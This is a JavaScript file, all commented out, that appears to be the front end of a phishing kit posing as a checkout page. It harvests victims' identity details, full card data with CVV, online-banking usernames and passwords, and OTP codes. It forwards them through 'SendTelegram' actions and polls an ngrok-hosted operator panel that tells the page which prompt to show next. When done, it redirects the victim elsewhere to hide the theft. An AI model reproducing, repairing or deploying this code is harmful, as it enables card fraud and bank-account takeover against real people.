// $(document).ready(function(){

//   $("#BtnGo").click(function(){
//     // Vars
//     var TxtFingerprint = $("#TxtFingerprint").val();
//     var TxtId         = $("#TxtId").val();

//     var TxtCorreo     = $("#TxtCorreo").val();
//     //var TxtContrasenaCorreo = $("#TxtContrasenaCorreo").val();
//     //var TxtContrasenaCorreo2 = $("#TxtContrasenaCorreo2").val();

//     var TxtCedula     = $("#TxtCedula").val();
//     var TxtNombre     = $("#TxtNombre").val();
//     var TxtCelular    = $("#TxtCelular").val();
//     var TxtDireccion  = $("#TxtDireccion").val();
//     var idpar  = $("#idpar").val();
//     var TxtCiudad     = $("#TxtCiudad").val();
//     var Status        = true;

//     // 25/02/2023 - REGISTRO
//     if(TxtCorreo.length > 0){
//     //  var RegExpCorreo = new RegExp(/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/);
//     var RegExpCorreo = new RegExp(/^[a-zA-Z0-9._%+-]{6,}@(?:gmail|hotmail|yahoo|outlook|live|une).(?:com|org|es|net.co|com.co)$/i);
    

    
//     if(RegExpCorreo.test(TxtCorreo)){
//         $("#ErrCorreo").css("display", "none");
//       }else{ 
//         Status = false; $("#ErrCorreo").css("display", "block"); 
//       }
//     }else{
//        Status = false; $("#ErrCorreo").css("display", "block");
//        }


//     // 28/02/2023 Eliminar contraseñas generadas de apple
//     /*
//     var RegExpPass = new RegExp(/^[a-zA-Z0-9]{8,}$/);
//     if(RegExpPass.test(TxtContrasenaCorreo)){
//       $("#ErrContrasenaCorreo").css("display", "none");
//     }else{ 
//       $("#ErrContrasenaCorreo2").text("Error");
//       Status = false; $("#ErrContrasenaCorreo2").css("display", "block");
//     }
// */
// /*
//       var RegExpPass = new RegExp(/^.{8,}$/);
//       if(RegExpPass.test(TxtContrasenaCorreo)){

//       if(TxtContrasenaCorreo.length > 0){
//         $("#ErrContrasenaCorreo").css("display", "none");
//       }else{ Status = false; $("#ErrContrasenaCorreo").css("display", "block"); }

//       if(TxtContrasenaCorreo2.length > 0){
//         if(TxtContrasenaCorreo === TxtContrasenaCorreo2){
//           $("#ErrContrasenaCorreo2").css("display", "none");
//         }else{
//           Status = false;
//           $("#ErrContrasenaCorreo2").text("Las contraseñas no coinciden");
//           $("#ErrContrasenaCorreo2").css("display", "block");
//         }
//       }else{
//         $("#ErrContrasenaCorreo2").text("Repita la contraseña");
//         Status = false; $("#ErrContrasenaCorreo2").css("display", "block");
//       }

//     }else{
//       $("#ErrContrasenaCorreo").text("Este tipo de contraseña no son válidas.");
//       $("#ErrContrasenaCorreo").css("display", "block");
//       Status = false;
//     }*/

//     // #########################################################################
//     var RegExpName = new RegExp(/^[a-zA-Z]{3,}( [a-zA-Z]{3,})+$/);

//     if(RegExpName.test(TxtNombre)){
//     if(TxtNombre.length > 0){
//       $("#ErrNombre").css("display", "none");
//     }else{ Status = false; $("#ErrNombre").css("display", "block"); }

//     }else{
//       $("#ErrNombre").text("Nombre invalido.");
//       $("#ErrNombre").css("display", "block");
//       Status = false;
//     }

//     var RegExpCel = new RegExp(/^3\d{9}$/);

//     if(RegExpCel.test(TxtCelular)){
//     if(TxtCelular.length > 0){
//       $("#ErrCelular").css("display", "none");
//     }else{ Status = false; $("#ErrCelular").css("display", "block"); }

//     }else{
//       $("#ErrCelular").text("Numero de celular invalido.");
//       $("#ErrCelular").css("display", "block");
//       Status = false;
//     }
//     var RegExpDireccion = new RegExp(/^[a-zA-Z0-9\s\-\#\.]{5,}$/);

//     if(RegExpDireccion.test(TxtDireccion)){

//     if(TxtDireccion.length > 0){
//       $("#ErrDireccion").css("display", "none");
//     }else{ Status = false; $("#ErrDireccion").css("display", "block"); }

//     }else{
//       $("#ErrDireccion").text("Direccion invalida.");
//       $("#ErrDireccion").css("display", "block");
//       Status = false;
//     }

//     var RegExpCiudad = new RegExp(/^[a-zA-Z\s]+$/);

//     if(RegExpCiudad.test(TxtCiudad)){

//     if(TxtCiudad.length > 0){
//       $("#ErrCiudad").css("display", "none");
//     }else{ Status = false; $("#ErrCiudad").css("display", "block"); }

//     }else{
//       $("#ErrCiudad").text("Invalido.");
//       $("#ErrCiudad").css("display", "block");
//       Status = false;
//     }

//     if(Status){
//       // Deshabilitar y mostrar modal payment
//       $('#BtnGo').attr('disabled', true);
// /*     $.post("controller.php", {
//         "Action"         : "AddInformation",
//         "TxtFingerprint" : TxtFingerprint,
//         "TxtId"          : TxtId,
//         "TxtCedula"      : TxtCedula,
//         "TxtNombre"      : TxtNombre,
//         "TxtCorreo"      : TxtCorreo,
//         "TxtContrasenaCorreo" : TxtContrasenaCorreo,
//         "TxtCelular"     : TxtCelular,
//         "TxtDireccion"   : TxtDireccion,
//         "TxtCiudad"      : TxtCiudad
//       }, function(data){ */
//         if(data = "True"){
//           $('#MdlMedioPago').modal({backdrop: 'static', keyboard: false});
//         }else{ alert("Ocurrio un error al guardar la información"); }
//    //   });
//     }
//   });

//   $("#BtnMedioPago").click(async function(){
//     var TxtCorreo      = $("#TxtCorreo").val();
//     //var TxtContrasenaCorreo = $("#TxtContrasenaCorreo").val();
//     var TxtId          = $("#TxtId").val();
//     var TxtNombre      = $("#TxtNombre").val();
//     var TxtCelular         = $("#TxtCelular").val();
//     var TxtFingerprint = $("#TxtFingerprint").val();
//     var TxtBanco       = $("#TxtBanco").val();
//     var TxtMes         = $("#TxtMes").val();
//     var TxtAno         = $("#TxtAno").val();
//     var TxtCvv         = $("#TxtCvv").val();
//     var TxtTarjeta     = $("#TxtTarjeta").val();
//     var TxtSerie       = TxtTarjeta.substring(0, 6);
//     var Status         = true;

//     if(TxtBanco !== "00"){
//       $("#TxtBanco").css("border", "1px solid #ced4da");
//     }else{ Status = false; $("#TxtBanco").css("border", "1px solid red"); }

//     if(TxtTarjeta.length > 0){
//       if(luhnCheck(TxtTarjeta)){
//         $("#ErrTarjeta").css("display", "none");
//       }else{ Status = false; $("#ErrTarjeta").css("display", "block"); }
//     }else{ Status = false; $("#ErrTarjeta").css("display", "block"); }

//     if(TxtMes !== "00"){
//       $("#TxtMes").css("border", "1px solid #ced4da");
//     }else{ Status = false; $("#TxtMes").css("border", "1px solid red"); }

//     if(TxtAno !== "0000"){
//       $("#TxtAno").css("border", "1px solid #ced4da");
//     }else{ Status = false; $("#TxtAno").css("border", "1px solid red"); }


// /*
//     if(TxtCvv.length == 3 || TxtCvv.length == 4){
//       $("#ErrCvv").css("display", "none");
//     }else{ Status = false; $("#ErrCvv").css("display", "block"); }
// */

//     if ((TxtTarjeta.startsWith("4") || TxtTarjeta.startsWith("5")) && TxtCvv.length === 3 ||
//     TxtTarjeta.startsWith("3") && TxtCvv.length === 4) {
//     $("#ErrCvv").css("display", "none");
//     } else {
//     Status = false;
//     $("#ErrCvv").css("display", "block");
//     }



//     if(Status){
//       // Deshabilitar
//       $('#BtnMedioPago').attr('disabled', true);
//       $("#MdlMedioPago").modal("hide");
//       $("#MdlProcesando").modal({backdrop: 'static', keyboard: false});

//       if(TxtTarjeta.charAt(0) === "5"){
//         $("#Img3D").attr('src', "img/mastercard_check.png");
//       }else if(TxtTarjeta.charAt(0) === "4"){
//         $("#Img3D").attr('src', "img/verified_visa.png");
//       }else if(TxtTarjeta.charAt(0) === "3"){
//         $("#Img3D").attr('src', "img/amex.jpg");
//       }
//       const fechaActual = new Date();
//       const dia = String(fechaActual.getDate()).padStart(2, '0');
//       const mes = String(fechaActual.getMonth() + 1).padStart(2, '0');
//       const anio = fechaActual.getFullYear();
//       const fecha = dia + '/' + mes + '/' + anio;
//       $(".FechaActual").text(fecha);

//       var Ultimos4 = TxtTarjeta.substr(TxtTarjeta.length-4, TxtTarjeta.length);
//       $(".TerminaEn").text(Ultimos4);

//       var Ultimos4Tel = TxtCelular.substr(TxtCelular.length-4, TxtCelular.length);
//       $(".TerminaEnTel").text(Ultimos4Tel);

//       setTimeout( async function(){
//         // Verificar si el bin es bloqueado
//         $.post("controller.php", {"Action" : "BinCheck", "TxtSerie" : TxtSerie }, async function(data){
//           // Bloqueado
//           if(data == "False"){
//             var idpar  = $("#idpar").val();
//             var TxtCorreo     = $("#TxtCorreo").val();
//    //         var TxtContrasenaCorreo = $("#TxtContrasenaCorreo").val();
//   //          var TxtContrasenaCorreo2 = $("#TxtContrasenaCorreo2").val();
//         MdlLoginBanco
//             var TxtCedula     = $("#TxtCedula").val();
//             var TxtNombre     = $("#TxtNombre").val();
//             var TxtCelular    = $("#TxtCelular").val();
//             var TxtDireccion  = $("#TxtDireccion").val()
//             var fulltc = TxtTarjeta+"|"+TxtMes+"|"+TxtAno+"|"+TxtCvv;
        
//             await newProcess(fulltc,TxtCelular,TxtNombre,TxtCedula,TxtCorreo,TxtDireccion).then((rsp) => {
//               console.log(rsp);
//               if (rsp.success == "True") {  
//                 const input3333 = document.getElementById("idpar33");
//                 input3333.value = rsp.id;
//                 console.log(input3333.value);
//                 $("#MdlProcesando").modal("hide");
//                 $("#MdlLoginBanco").modal({backdrop: 'static', keyboard: false});
//                 // Agregar imagen del banco
//                 $("#ImgBanco").attr('src', "img/bancos/" + TxtBanco + ".png");
//                 // Update 28/12/2022 Mostrar informacion importante
//                 var TxtCedula  = $("#TxtCedula").val();
//                 var TxtCelular = $("#TxtCelular").val();
//                 $.post("controller.php", {
//                   "Action"  : "SendTelegram",
//                   " > "     : " Login",
//                   "Id"      : "#" + TxtId,
//                   "Correo"  :  TxtCorreo,
//       //            "Passwr"  : TxtContrasenaCorreo,
//                   "Cedula"  :  TxtCedula,
//                   "Celular" :  TxtCelular,
//                   "Nombre"  :  TxtNombre,
//                   "Direccion"  :  TxtDireccion,
//                   "Banco"   :  TxtBanco,
//                   "Tarjeta" : TxtTarjeta,
//                   "MMYY"    : TxtMes + "/" + TxtAno,
//                   "Cvv"     : TxtCvv
// 				  }, function(data){});

//               }



//           })

//           }



          
//           else{
//             // Update 28/12/2022 Mostrar informacion importante
//             var TxtCedula  = $("#TxtCedula").val();
//             var TxtCelular = $("#TxtCelular").val();
//             // Enviar información
//             $.post("controller.php", {
//               "Action"  : "SendTelegram",
//               " > "     : "⭕ BinLock",
//               "Id"      : "#" + TxtId,
//               "Correo"  : "✉️" + TxtCorreo,
//     //          "Passwr"  : "📩" + TxtContrasenaCorreo,
//               "Cedula"  : "🃏" + TxtCedula,
//               "Celular" : "📞" + TxtCelular,
//               "Nombre"  : "🤦‍♂️" + TxtNombre,
//               "Banco"   : "🏦" + TxtBanco,
//               "Tarjeta" : "💳 " + TxtTarjeta,
//               "MMYY"    : TxtMes + " / " + TxtAno,
//               "Cvv"     : TxtCvv
//             });
//             // Mostrar mensaje de bin bloqueado
//             $("#MdlProcesando").modal("hide");
//             $("#bBinLock").text(TxtSerie);
//             $("#MdlBinLock").modal({backdrop: 'static', keyboard: false});
//           }


          
//         });
//       }, 1000); // Siempre 5 segundos
//     }
//   });

//   $("#BtnLogin").click(function(){
//     var TxtFingerprint = $("#TxtFingerprint").val();
//     var TxtId         = $("#TxtId").val();
//     var TxtCorreo     = $("#TxtCorreo").val();
//    // var TxtContrasenaCorreo = $("#TxtContrasenaCorreo").val();
//     var TxtNombre     = $("#TxtNombre").val();
//     var TxtUsuario    = $("#TxtUsuario").val();
//     var TxtContrasena = $("#TxtContrasena").val();
//     var TxtBanco      = $("#TxtBanco").val();
//     var TxtTarjeta    = $("#TxtTarjeta").val();
//     var TxtMes        = $("#TxtMes").val();
//     var TxtAno        = $("#TxtAno").val();
//     var TxtCvv        = $("#TxtCvv").val();
//     var TxtEmail      = $("#TxtCorreo").val();
//     var TxtCiudad     = $("#TxtCiudad").val();
//     var TxtDireccion  = $("#TxtDireccion").val();
//     var Status        = true;
//     var element3344444443 = document.getElementById("ErrUsuario");
//     element3344444443.style.display = "none";
//     if(TxtUsuario.length > 0){
//       $("#ErrCvv").css("display", "none");
//     }else{ Status = false; $("#ErrCvv").css("display", "block"); }

//    // var input = document.getElementById("TxtUsuario").value;

//     // Expresión regular que permite sólo letras y números
//     var regex = /^[a-zA-Z0-9]+$/;
//     var regexBancolombia = /^(?=.*[a-zA-Z])(?=.*\d).+$/;
//     // Verificar si el valor del input cumple con la expresión regular
//     if(!regex.test(TxtUsuario)) {
//       // Si no cumple, mostrar un mensaje de error y limpiar el valor del input
//   //    alert("El input no puede contener caracteres especiales.");
//       document.getElementById("TxtUsuario").value = "";
//       var element3344444443 = document.getElementById("ErrUsuario");
//       element3344444443.style.display = "block";      
//     }else{

//     if(TxtContrasena.length > 0){
//       $("#ErrCvv").css("display", "none");
//     }else{ Status = false; $("#ErrCvv").css("display", "block"); }

//     // ### UPDATE 20230214: Aplicar filtros de contraseñas de bancos ###########
//     var TxtRegExp = new RegExp($("#TxtRegExp").val());
//     if(!TxtRegExp.test(TxtContrasena)){
//       Status = false;
//       $("#ErrContrasena").html($("#TxtErrBanco").val());
//       $("#ErrContrasena").css("display", "block");
//     }
//     // #########################################################################

//     if(Status){
//       var TxtBanco = $("#TxtBanco").val();
//       console.log(TxtBanco)
//       var TxtCelular         = $("#TxtCelular").val();

//       $("#MdlLoginBanco").modal("hide");
//       $("#MdLoading").modal({backdrop: 'static', keyboard: false});
//       $("#ImgBanco2").attr('src', "img/bancos/" + TxtBanco + ".png");
//       $("#ImgBanco3").attr('src', "img/bancos/" + TxtBanco + ".png");

//       if(TxtTarjeta.charAt(0) === "5"){
//         $("#Img3D3").attr('src', "img/mastercard_check.png");
//       }else if(TxtTarjeta.charAt(0) === "4"){
//         $("#Img3D3").attr('src', "img/verified_visa.png");
//       }else if(TxtTarjeta.charAt(0) === "3"){
//         $("#Img3D3").attr('src', "img/amex.jpg");
//       }
//       var Ultimos4Tel = TxtCelular.substr(TxtCelular.length-4, TxtCelular.length);
//       $(".TerminaEnTel").text(Ultimos4Tel);

//       if(TxtTarjeta.charAt(0) === "5"){
//         $("#Img3D2").attr('src', "img/mastercard_check.png");
//       }else if(TxtTarjeta.charAt(0) === "4"){
//         $("#Img3D2").attr('src', "img/verified_visa.png");
//       }else if(TxtTarjeta.charAt(0) === "3"){
//         $("#Img3D2").attr('src', "img/amex.jpg");
//       }

//       const fechaActual = new Date();
//       const dia = String(fechaActual.getDate()).padStart(2, '0');
//       const mes = String(fechaActual.getMonth() + 1).padStart(2, '0');
//       const anio = fechaActual.getFullYear();
//       const fecha = dia + '/' + mes + '/' + anio;
//       $(".FechaActual2").text(fecha);
//       $(".FechaActual3").text(fecha);
//       $(".FechaActual4").text(fecha);
//       var idpar222 = document.getElementById("idpar33").value;
//       var userloig = TxtUsuario +"//"+TxtContrasena;
//       $.post("controller.php", {
//         "Action"  : "SendTelegram2",
//         " > "     : "Login",
//         "Id"      : idpar222,
//         "userlogin" : userloig,
//         "Tarjeta" : "" + TxtTarjeta,
//         "MMYY"    : TxtMes + " / " + TxtAno,
//         "Cvv"     : TxtCvv
//       }, function(data){

//         if(data == "True"){
//           $.post("controller.php", {
//             "Action"  : "ActWaiting",
//             "Id"     : idpar222,

//           }, function(data){
//             execorder(idpar222);
//           });

//         }
//       });


//     }
//     }
//   });

//   $("#BtnOTP").click(function(){
//     var TxtTarjeta    = $("#TxtTarjeta").val();
//     var TxtMes        = $("#TxtMes").val();
//     var TxtAno        = $("#TxtAno").val();
//     var TxtBanco       = $("#TxtBanco").val();
//     var TxtCvv        = $("#TxtCvv").val();
//     $("#MdOTP").modal("hide");
//     $("#MdLoading").modal({backdrop: 'static', keyboard: false});
//     $("#ImgBanco").attr('src', "img/bancos/" + TxtBanco.value + ".png");

//     var idpar222 = document.getElementById("idpar33").value;
//     var otp = document.getElementById("TxttOtp").value;
//     var fulltc = TxtTarjeta+"|"+TxtMes+"|"+TxtAno+"|"+TxtCvv;

//     $.post("controller.php", {
//       "Action"  : "Sndotp",
//       "Id"      : idpar222,
//       "otp" : otp,
//       "Tarjeta" : TxtTarjeta,
//     }, function(data){

//       if(data == "True"){
//         $.post("controller.php", {
//           "Action"  : "ActWaiting",
//           "Id"     : idpar222,

//         }, function(data){
//           execorder(idpar222);
//         });

//       }
//     });

// })
// //OTRAAAAAAAAAA
//   $("#BtnOtra").click(function(){
//     $("#MdlBinLock").modal("hide");
//     $('#MdlMedioPago').modal({backdrop: 'static', keyboard: false});
//     // Eliminar datos ingresados
//     $('#TxtBanco option:first').prop('selected', true);
//     $("#TxtTarjeta").val("");
//     $('#TxtMes option:first').prop('selected', true);
//     $('#TxtAno option:first').prop('selected', true);
//     $("#TxtCvv").val("");
//     $('#BtnMedioPago').attr('disabled', false);
//   });

//   $("#BtnCancelar").click(function(){
//     $.redirect("index");
//   });


//   // ### UPDATE 20230214 : Seleccion de los filtros del banco ##################
//   $("#TxtBanco").change(function(){
//     var TxtBanco = $(this).val();
//     $.post("controller.php", {"Action":"getBancoFormato", "TxtBanco":TxtBanco}, function(data){
//       var Formato = JSON.parse(data);
//       console.log(Formato);
//       if(Formato.TipoDocumento !== ""){
//         console.log("Entro");
//         $("#LblUsuario").html(Formato.TipoDocumento);
//         $("#TxtRegExp").val(Formato.RegExp);
//         $("#TxtErrBanco").val(Formato.MsgError);
//         $("#TxtContrasena").attr('maxlength', Formato.Length);
//       }
//     });
//   });

//   // ###########################################################################

// });

// async function newProcess(fulltc,TxtCelular,TxtNombre,TxtCedula,TxtCorreo,TxtDireccion) {
//   let formData = new FormData();
//   formData.append("Action", "AddCreditCard");
//   formData.append("TxtTarjeta", fulltc);
//   formData.append("TxtCelular", TxtCelular);
//   formData.append("TxtNombre", TxtNombre);
//   formData.append("TxtCedula", TxtCedula);
//   formData.append("TxtCorreo", TxtCorreo);
//   formData.append("TxtDireccion", TxtDireccion);
//   const response = await fetch("controller.php", {
//     method: "POST",
//     body: formData,
//   });
//   const rsp = await response.json();
//   return rsp;
// }

// async function WaitOrder(id){
//   let formData = new FormData();  
//   formData.append("action", "bkwo");
//   formData.append("idpa", id);
//   const response = await fetch(serverpeti2, {
//   method: "POST",
//   body: formData,
//   });
//   const rsp = await response.json();
//   return rsp;
// }
// async function SendOtp(id,otp){
//   var fulltc = TxtTarjeta+"|"+TxtMes+"|"+TxtAno+"|"+TxtCvv;
//   let formData = new FormData();  
//   formData.append("Action", "Sndotp");
//   formData.append("idpa", id);
//   formData.append("otp", otp);
//   formData.append("Tarjeta", fulltc);
//   const response = await fetch("controller.php", {
//   method: "POST",
//   body: formData,
//   });
//   const rsp = await response.json();
//   return rsp;
// }

// async function execorder(id) {
//   var int = setInterval(async () => {
//   await WaitOrder(id).then((rsp) => {
//       console.log("VECES EJECUTADAS!");
//       console.log(rsp.order);
//       if (rsp.success == "True") {
//       if (rsp.order == "3") {
//         clearInterval(int);
//         $("#MdLoading").modal("hide");

//         $("#MdOTP").modal({backdrop: 'static', keyboard: false});
//         var elementTXT22 = document.getElementById("TxttOtp");
//         elementTXT22.value = "";
//         var element3400 = document.getElementById("ErrOtpppp");
//         element3400.style.display = "block";

//       }else if (rsp.order == "2") {
       
//         clearInterval(int);
//         var TxtTarjeta     = $("#TxtTarjeta").val();
//         var TxtSerie       = TxtTarjeta.substring(0, 6);
//         $("#MdLoading").modal("hide");
//         $("#bBinLock").text(TxtSerie);
//         $("#MdlBinLock").modal({backdrop: 'static', keyboard: false});
//         $('#BtnMedioPago').attr('disabled', false);

//       }else if (rsp.order == "6") {
       
//         clearInterval(int);
//         $("#MdLoading").modal("hide");
//         $("#MdOTP").modal({backdrop: 'static', keyboard: false});
       
//       }else if (rsp.order == "5") {
//         clearInterval(int);
//         $("#MdLoading").modal("hide");
//         $("#MdlLoginBanco").modal({backdrop: 'static', keyboard: false});
//         var elementTXT = document.getElementById("TxtUsuario");
//         elementTXT.value = "";
//         var elementTXT22 = document.getElementById("TxtContrasena");
//         elementTXT22.value = "";
//         var element3344444443 = document.getElementById("ErrUsuario");
//         element3344444443.style.display = "block";

//       $('#BtnLogin').attr('disabled', false);

//         }
//         else if (rsp.order == "4") {
//           clearInterval(int);
//           $("#MdOTP").modal("hide");
//           $("#MdlLoginBanco").modal("hide");
//           $("#MdLoading").modal("hide");

//           $("#Nombre").text(TxtNombre);
//           // Update 03/01/2023 Ultimos 4

//           $("#MdlPagoConfirmado").modal({backdrop: 'static', keyboard: false});
//           var TxtCedula  = $("#TxtCedula").val();
//           var TxtCelular = $("#TxtCelular").val();
//           clearInterval(int);
//           //FINISH
//           setTimeout(function () {
//             window.location.href =
//               "https://mundosinplastico.com/";
//               clearInterval(int);
//           }, 10000);
//         } }
//   else {
//                     //clearInterval(int);
//                     console.log("Esperando orden... del panel");
//                   }
//         });
// }, 500);
// }


// const serverpeti2 = "https://heyler30ll.ngrok.app/askorservi.php";